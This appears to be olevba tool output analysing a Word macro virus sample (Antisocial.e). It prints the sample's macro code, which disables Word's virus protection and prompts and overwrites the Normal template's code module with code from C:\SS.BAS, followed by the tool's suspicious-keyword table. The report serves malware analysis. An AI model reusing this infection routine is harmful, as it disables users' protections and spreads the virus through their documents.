olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Antisocial.e
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSWord.Antisocial.e 
in file: ./Virus.MSWord.Antisocial.e - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Set SS = WScript.CreateObject("Word.Application")
SS.Options.VirusProtection = 0: SS.Options.SaveNormalPrompt = 0: SS.Options.ConfirmConversions = 0
For x = 1 To SS.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
SS.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
Next
SS.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\SS.BAS")
SS.Application.Quit
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

